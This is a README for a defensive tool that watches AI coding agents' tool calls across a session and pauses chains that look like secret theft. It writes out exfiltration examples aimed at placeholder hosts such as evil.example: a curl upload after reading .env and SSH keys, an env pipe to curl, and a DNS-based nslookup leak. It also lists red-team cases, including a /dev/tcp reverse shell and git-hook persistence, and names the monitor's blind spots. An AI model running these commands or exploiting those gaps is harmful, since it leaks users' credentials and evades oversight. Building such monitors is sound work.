# AI Runtime Guard

**A local-first runtime safety layer for AI coding agents.**

Your agent can read your filesystem, run your shell, reach the network, and push
to your remotes. Each of those is fine. The *sequence* is what matters:

```
Read README.md   →   Read .env   →   Read ~/.ssh/id_rsa   →   curl -d @dump evil.example
     harmless         harmless            harmless                  too late
```

Tools that judge one call at a time cannot see that. AI Runtime Guard models the
whole **session**, so risk accumulates the way an attack actually does.

```
[ PAUSE] Outbound connection to collect.unknown-host.example
         why: This session has sent data off the machine after reading key
              material, read secrets and then sent data off the machine, and
              read reusable key material. Risk 100/100 (confidence 90%).
    evidence: toolu_01WPggEN…, toolu_01AWuxnw…
    guidance: Session paused. Run `guard resume`, or allowlist
              collect.unknown-host.example for this workspace if it is expected.
       +48  sent data off the machine after reading key material
       +42  read secrets and then sent data off the machine
       +24  read reusable key material
```

Every point on that board traces to a named factor with evidence. There are no
unexplained numbers.

---

## Quick start

```bash
git clone https://github.com/TranChiHuu/ai-runtime-guard
cd ai-runtime-guard
./scripts/install.sh

guard up          # start the daemon
guard doctor      # verify it
guard simulate    # watch it decide, no agent required
```

---

## Protecting a real session

`install.sh` deliberately does not register the hook. A hook applies to every
session in a project, so that is your call to make — a security tool that
installs itself without asking has picked a strange place to start earning
trust.

Add this to the `.claude/settings.json` of the project you want protected:

```jsonc
{
  "hooks": {
    "PreToolUse":  [{ "hooks": [{ "type": "command", "command": "/abs/path/to/ai-runtime-guard/.claude/hooks/guard.sh" }] }],
    "PostToolUse": [{ "hooks": [{ "type": "command", "command": "/abs/path/to/ai-runtime-guard/.claude/hooks/guard.sh" }] }],
    "SessionEnd":  [{ "hooks": [{ "type": "command", "command": "/abs/path/to/ai-runtime-guard/.claude/hooks/guard.sh" }] }]
  }
}
```

Hooks are read when a session starts, so this will not affect a session already
running. Start a new one, then:

```bash
guard status      # live sessions, states, risk
guard report      # decisions and their full explanations
```

---

## Commands

| | |
|---|---|
| `guard up` | start the daemon |
| `guard status` | live sessions, safety state, risk |
| `guard doctor` | verify socket, config, storage |
| `guard report [session]` | decisions with their explanations |
| `guard replay <session>` | re-run a recorded session against the current model |
| `guard learned` / `guard revoke <id>` | inspect and remove learned preferences |
| `guard purge` | delete everything stored locally |
| `guard simulate` | run built-in scenarios through the daemon |

Colour follows `NO_COLOR`, and turns itself off when output is not a terminal so
`guard report | grep` stays usable.

---

## How it decides

```
Observe  →  Understand  →  Predict  →  Intervene  →  Learn
```

**Capabilities latch.** A session that read `.env` an hour ago is still a
session that has seen secrets. They reset only when the session ends.

**Combinations carry the signal.** Individual capabilities score low; their
co-occurrence scores high. Reading a secret is unremarkable. Reaching the
network is unremarkable. Doing both, then sending data, is the actual threat.

**Reaching a host ≠ sending data.** `npm install` after reading a config file
has the same capability set as an exfiltration chain. Measured on a real
session, conflating them cost 20 points and one unnecessary interruption.

**Confidence is separate from score.** Score says how bad if real. Confidence
says how sure we are. A high score we are unsure about notifies; it never
blocks.

**Blocking is last.** `ALLOW → NOTIFY → ASK → PAUSE → BLOCK`, climbed and not
jumped. Only irreversible actions may reach the top: a file write in a clean git
tree can be undone, and interrupting you over something you can revert spends
trust for nothing.

**If the daemon dies, your agent keeps working.** Fail-open by default, with a
loud warning. A guard that breaks your workflow gets uninstalled, and an
uninstalled guard protects nobody. Set fail-closed explicitly if your
environment needs it.

Weights live in [`core/config/weights.json`](core/config/weights.json) — data,
not code. Tune them, then prove the change with `guard replay` against sessions
you have already recorded.

---

## What it catches

`scripts/redteam.py` pushes real hook payloads through the real adapter into the
real daemon and reports what got through. Current: **17/18**.

| | |
|---|---|
| read `.env` → upload | PAUSE 100 |
| `cat .env` instead of the Read tool | PAUSE 100 |
| base64 through a pipe | PAUSE 100 |
| exfil in a URL query string | PAUSE 100 |
| `env \| curl --data-binary @-` | PAUSE 100 |
| reverse shell via `/dev/tcp` | PAUSE 87 |
| attacker git remote, then push | ASK 55 |
| secret read early, sent 12 steps later | PAUSE 100 |
| exfil split across a subagent | PAUSE 100 |
| `.git/hooks/pre-commit` persistence | NOTIFY 28 |
| *control:* fetch docs while holding secrets | ALLOW 0 |

### What it does not catch

Stated plainly, because a security tool that only advertises its wins is
teaching you to trust it in exactly the places you should not:

- **DNS exfiltration is not detected.** `nslookup $(base64 .env).evil.example`
  scores only on the prior secret read. Nothing in the model understands port
  53; with no prior read it scores zero.
- **A bare pipe into a network tool** is caught by that tool's own flags, not by
  the pipe.
- **Content is never inspected.** The guard reasons about behaviour, not bytes.
  It cannot tell a secret from a lorem ipsum inside a request body.
- **An allowlisted destination is a real hole.** It is a −40 mitigation, so
  routing through a host you have allowlisted lowers the score by design.

Found another? `scripts/redteam.py` is where it goes.

---

## Architecture

```
              AI Agent  (Claude Code, …)
                  │
      TypeScript adapters — map and transport only
                  │
        gRPC over a Unix domain socket
                  │
  ┌───────────────────────────────────┐
  │        Runtime Brain (Go)         │
  │  Session · Context · Risk         │
  │  Policy · Decision · Audit        │
  └───────────────────────────────────┘
                  │
          Local SQLite
```

Three rules hold the shape:

1. **Adapters never decide.** They answer "what is this", never "how bad is
   this". An adapter containing a security-relevant `if` has a bug.
2. **The Brain never learns platform vocabulary.** Adding an agent platform
   requires zero Go changes.
3. **Every decision explains itself.** One that cannot is not enforced — it
   degrades to fail-open and says so.

Local-first is structural, not a policy: there is no listening port, no network
call in the decision path, and no secret value ever reaches disk. Decisions land
in **3–38 µs** against a 50 ms budget.

Read [`docs/CONSTITUTION.md`](docs/CONSTITUTION.md) first — it is the twelve
rules everything else answers to. Then
[`docs/RUNTIME_MODEL.md`](docs/RUNTIME_MODEL.md) for the schemas and
[`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the boundaries.

---

## Status

Early. The Runtime Brain, the Claude Code adapter, the CLI, storage, and replay
all work end to end and are tested against payloads captured from live sessions
(`testdata/hook-events/`).

Not built yet: the local dashboard, `guard resume` / `guard deny` for paused
sessions, and adapters for Codex, Gemini, Cursor, and MCP.

[`docs/TODO.md`](docs/TODO.md) is the honest list — including three bugs where
the product currently claims to do something it does not.

The risk weights are a first honest guess. They will be wrong for your
workflows before they are right — `guard replay` exists so you can change them
and prove what the change did.

---

## Contributing

Whatever you add, the constitution comes first. In particular: no business logic
in adapters, no platform names inside the Brain, and no decision without an
explanation.

```bash
cd core && go test ./...     # Brain
pnpm -r test                 # adapters
./scripts/e2e.sh             # the whole stack
python3 scripts/redteam.py   # what still gets through
```

## License

MIT
